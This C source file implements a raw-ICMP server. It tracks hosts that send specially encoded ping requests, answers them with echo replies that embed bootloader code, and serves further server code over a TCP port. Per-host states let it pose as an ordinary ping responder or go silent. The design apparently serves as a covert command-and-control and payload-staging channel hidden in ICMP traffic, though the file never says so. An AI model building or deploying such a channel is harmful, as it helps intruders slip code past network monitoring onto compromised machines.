#include "preboot.h"
#include "protocol/preboot.h"
#include "protocol/dispatcher.h"
#include "config.h"

#include <sys/time.h>
#include <ax/hmap.h>

#include <linux/icmp.h>
#include <netinet/ip.h>
#include <assert.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>
#include <stdio.h>

#define BOOT_PORT_BACKLOG 32

#define ax_trait_define_shallow_copy(tr, fun) \
	static ax_fail fun(void *dst, const void *src) \
{ \
	memcpy(dst, src, sizeof(ax_type(tr))); \
	return false; \
}

#define ICMP_PACKET_MAX_SIZE 2048

static uint16_t in_cksum(uint16_t *addr, int len);

ax_trait_define_shallow_copy(preboot_host_sess, host_session_copy);
ax_trait_define(preboot_host_sess, COPY(host_session_copy));

static ax_reactor *g_reactor = NULL;
static ax_event g_preboot_event;
static ax_event g_boot_event;
static ax_hmap_r g_session_map;
static enum preboot_state g_stranger_state = PREBOOT_STATE_BOOT;
static struct { ax_byte *ptr; size_t size; } g_bootloader_code;
static struct { ax_byte *ptr; size_t size; } g_server_code;

uint16_t in_cksum(uint16_t *addr, int len)
{
	int nleft = len;
	uint32_t sum = 0;
	uint16_t *w = addr;
	uint16_t answer = 0;

	while (nleft > 1)  {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(unsigned char *)(&answer) = *(unsigned char *)w ;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return(answer);
}

static void send_echo_reply(ax_socket sock, ax_byte *request, size_t len, enum preboot_state state, bool is_preboot_request)
{

	const unsigned data_offset = (sizeof(struct iphdr) + sizeof(struct icmphdr));
	struct iphdr* ip_hdr = (void *)request;
	struct icmphdr*	icmp_hdr = (void *)(request + sizeof(struct iphdr));

	struct sockaddr_in reply_addr = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = ip_hdr->saddr,
		.sin_port = 0,
	};

        // ip_hdr->ihl =              5;
        // ip_hdr->version =          4;
        // ip_hdr->tos =              0;
        // ip_hdr->tot_len =          htons(len - sizeof(struct iphdr));
        // ip_hdr->frag_off =         0;
        // ip_hdr->protocol =         1;
        // ip_hdr->ttl =              htons(112);

	ax_swap(&ip_hdr->saddr, &ip_hdr->daddr, uint32_t);
        ip_hdr->check =            0;
        ip_hdr->check =            in_cksum((uint16_t*)ip_hdr, sizeof(struct iphdr));

	icmp_hdr->type = ICMP_ECHOREPLY;
	icmp_hdr->code = 0;
	icmp_hdr->checksum = 0;
	// gettimeofday((struct timeval *)icmp_hdr->un.reserved, NULL);

	switch (state) {
		case PREBOOT_STATE_BOOT:

			if (len - data_offset == g_bootloader_code.size) {
				memcpy(request + data_offset, g_bootloader_code.ptr, g_bootloader_code.size);
			}
			else if (is_preboot_request){
				struct preboot_reply reply = {
					.hdr.random = rand() % 0xFF,
					.hdr.mark = PREBOOT_MARK_REPLY_BOOT,
					.payload_size = g_bootloader_code.size,

				};
				preboot_encode((struct preboot_hdr *)&reply.hdr, sizeof reply, request +data_offset);
			}

			else
				break;

			//continue
		case PREBOOT_STATE_PRETEND:
			icmp_hdr->checksum = in_cksum((uint16_t*)icmp_hdr, len - sizeof(struct iphdr));
			(void)sendto(sock, request, len , 0, (struct sockaddr *)&reply_addr, sizeof(struct sockaddr));
			break;
		case PREBOOT_STATE_FILTER:
			break;
	}
}

void preboot_read_cb(ax_socket fd, short flags, void *args)
{
	ax_byte request_buf[ICMP_PACKET_MAX_SIZE];
	ssize_t len = recvfrom(g_preboot_event.fd, request_buf, sizeof request_buf, MSG_TRUNC, NULL, NULL);
	if (len == -1) {
		if (errno == EINTR)
			return;
		//TODO
		return;
	}
	if (len > sizeof request_buf)
		return;

	const unsigned data_offset = (sizeof(struct iphdr) + sizeof(struct icmphdr));

	struct iphdr* ip_hdr = (void *)request_buf;
	struct icmphdr*	icmp_hdr = (void *)(request_buf + sizeof(struct iphdr));

	if( icmp_hdr->code != 0 || icmp_hdr->type != ICMP_ECHO) 
		return;


	struct preboot_host_sess *psess = NULL;

	enum preboot_state current_state = g_stranger_state;
	if (len - data_offset != PREBOOT_REQUEST_DATA_SIZE )
		goto parse_end;
	struct preboot_request prereq;
	preboot_decode(request_buf + data_offset, PREBOOT_REQUEST_DATA_SIZE, (struct preboot_hdr*)&prereq);

	if (prereq.hdr.mark != PREBOOT_MARK_REQUEST)
		goto parse_end;

	if ((prereq.flags & 0xFC) != 0)
		goto parse_end;

	uint64_t host_uid = ax_hash_murmur64(&prereq, sizeof prereq);
	psess = ax_map_get(g_session_map.ax_map, &host_uid);

	if (psess) {
		psess->query_count += 1;
		psess->last_time = time(NULL);
		current_state = psess->state;
	}

	else {
		struct preboot_host_sess sess;
		sess.dst_addr = ntohl(ip_hdr->daddr);
		sess.src_addr = ntohl(ip_hdr->saddr);
		sess.state = g_stranger_state;
		sess.last_time = time(NULL);
		sess.major_version = prereq.version >> 4;
		sess.minor_version = prereq.version & 0x0F;
		sess.flags = prereq.flags;

		sess.query_count = 0;
		sess.serial_hash = prereq.serial_hash;
		memcpy(sess.hostname, prereq.hostname, sizeof prereq.hostname); //TODO charset issue
		sess.hostname[8] = '\0';

		psess = ax_map_put(g_session_map.ax_map, &host_uid, &sess);
		if (!psess) {
			ax_perror("failed to add session: %s", strerror(errno));
			return;
		}
	}
parse_end:;
	send_echo_reply(fd, request_buf, len, current_state, psess != NULL);
}

void boot_listen_cb(ax_socket fd, short flags, void *args)
{
	struct sockaddr_in inaddr;
	socklen_t socklen = sizeof inaddr;
	ax_socket cli_sock = accept(fd, (struct sockaddr *)&inaddr, &socklen);
	send(cli_sock, g_server_code.ptr, g_server_code.size, 0);
}

int preboot_startup(ax_reactor *reactor)
{
	int retval = -1;
	ax_assert(!g_reactor, "preboot unix have initialized yet");
	assert(reactor);

	ax_socket icmp_sock = AX_SOCKET_INVALID;
	ax_socket boot_sock = AX_SOCKET_INVALID;
	ax_hmap_r session_map = AX_R_NULL;

	session_map = ax_new(ax_hmap, ax_t(u64), ax_t(preboot_host_sess));
	if (ax_r_isnull(session_map))
		goto out;

	icmp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	if (icmp_sock == AX_SOCKET_INVALID)
		goto out;

	int32_t optval = 1;
	setsockopt(icmp_sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof optval);


	boot_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (boot_sock == AX_SOCKET_INVALID)
		goto out;

	struct sockaddr_in inaddr;
	inaddr.sin_family = AF_INET;
	inaddr.sin_addr.s_addr = INADDR_ANY;
	inaddr.sin_port = htons(CONFIG_BOOT_PORT);

	int reuse = 1;
	setsockopt(boot_sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof reuse);
	if (bind(boot_sock, (struct sockaddr *)&inaddr, sizeof inaddr)) {
		ax_perror("failed to bind port %d, error %s\n", CONFIG_BOOT_PORT, strerror(errno));
		goto out;
	}

	if (listen(boot_sock, BOOT_PORT_BACKLOG)) {
		ax_perror("failed to listen port %hu\n", CONFIG_BOOT_PORT);
		goto out;
	}

	g_preboot_event = ax_event_make(icmp_sock, AX_EV_READ, preboot_read_cb, NULL);
	g_boot_event = ax_event_make(boot_sock, AX_EV_READ, boot_listen_cb, NULL);
	g_session_map = session_map;

	ax_reactor_add(reactor, &g_preboot_event);
	ax_reactor_add(reactor, &g_boot_event);

	g_reactor = reactor;
	retval = 0;
out:
	if (retval) {
		if (icmp_sock != AX_SOCKET_INVALID)
			ax_socket_close(icmp_sock);
		if (boot_sock != AX_SOCKET_INVALID)
			ax_socket_close(boot_sock);
		ax_one_free(session_map.ax_one);
	}
	return retval;
}

void preboot_cleanup()
{
	ax_assert(g_reactor, "preboot unix is not initialized");
	ax_reactor_remove(g_reactor, &g_preboot_event);
	ax_one_free(g_session_map.ax_one);
	g_reactor = NULL;
}

int preboot_session_list(ax_list_r session_list)
{
	ax_assert(g_reactor, "preboot unix is not initialized");
	session_list = ax_r(ax_list, (ax_list *)ax_any_copy(g_session_map.ax_any));
	if (ax_r_isnull(session_list))
		return -1;
	return 0;
}

int preboot_set_state(uint64_t host_uuid, enum preboot_state state)
{
	ax_assert(g_reactor, "preboot unix is not initialized");
	struct preboot_host_sess *sess = ax_map_get(g_session_map.ax_map, &host_uuid);
	if (!sess)
		return -1;
	sess->state = state;
	return 0;
}

void preboot_set_stranger_state(enum preboot_state state)
{
	ax_assert(g_reactor, "preboot unix is not initialized");
	g_stranger_state = state;
}

int preboot_set_bootloader_code(ax_byte *payload, size_t size)
{
	void *ptr = malloc(size);
	if (!ptr)
		return -1;
	memcpy(ptr, payload, size);
	g_bootloader_code.ptr = ptr;
	g_bootloader_code.size = size;
	return 0;
}

int preboot_set_server_code(ax_byte *payload, size_t size)
{
	void *ptr = malloc(size);
	if (!ptr)
		return -1;
	memcpy(ptr, payload, size);
	g_server_code.ptr = ptr;
	g_server_code.size = size;
	return 0;
}
